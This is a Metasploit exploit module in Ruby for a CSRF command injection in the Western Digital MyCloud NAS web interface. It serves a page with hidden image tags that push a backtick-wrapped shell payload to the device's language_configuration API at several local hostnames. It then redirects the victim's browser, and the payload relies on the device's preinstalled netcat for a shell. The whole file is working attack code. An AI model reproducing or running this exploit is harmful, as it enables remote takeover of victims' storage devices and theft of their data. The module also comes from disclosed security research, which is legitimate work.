require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'WD MyCloud NAS CSRF Command Injection',
      'Description'     => %q{
            This module exploits a command injection vulnerability in the web
          interface of the Western Digital MyCloud NAS device. The exploit is
          written as a CSRF, since the WD MyCloud NAS will only allow API access
          from hosts on the local subnet. The exploit submits the CSRF requests
          to RHOST, as well as wdmycloud and wdmycloud.local. This device has
          netcat pre-installed, allowing for a simple netcat-based payload.
      },
      'Author'          => [ 'phikshun <0x41.phikshun@gmail.com>' ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          [ 'URL', 'http://disconnected.io/2014/03/19/get-off-of-mycloud/' ],
        ],
      'Platform'        => [ 'unix' ],
      'Arch'            => ARCH_CMD,
      'Privileged'      => true,
      'Payload'         =>
        {
          'Space'       => 1024,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'netcat',
            }
        },
      'Targets'         =>
        [
          [ 'WD MyCloud WDBCTL0040HWT 030401-219', { } ]
        ],
      'Privileged'      => false,
      'DefaultTarget'   => 0,
      'DisclosureDate'  => 'Mar 19 2014'))

    register_options([
      Opt::RHOST("192.168.1.100"),
      OptString.new("REDIRURL", [ false, "An URL to redirect the browser after REDIRDELAY", nil ]),
      OptInt.new("REDIRDELAY", [ true, "Milliseconds before the browser is redirected", 5000 ])
    ], self.class)
  end

  def generate_html
    params = "format=xml&rest_method=PUT&language=" + Rex::Text.uri_encode("`#{payload.encoded}`")

    if datastore['REDIRURL'] && datastore['REDIRDELAY']
      script = "<script>window.setTimeout(function(){ window.location = " +
               "'#{datastore['REDIRURL']}'; }, #{datastore['REDIRDELAY']}); </script>"
    else
      script = ''
    end

    "<html><body><div style='display:none'>" +
    "<img src='http://wdmycloud.local/api/1.0/rest/language_configuration?#{params}' />" +
    "<img src='http://wdmycloud/api/1.0/rest/language_configuration?#{params}' />" +
    "<img src='http://#{datastore['RHOST']}/api/1.0/rest/language_configuration?#{params}' /></div>" +
    script + "</body></html>"
  end

  def on_request_uri(cli, request)
    print_status("Sending CSRF Exploit")
    send_response_html(cli, generate_html, { 'Content-Type' => 'text/html' })
    handler(cli)
  end
end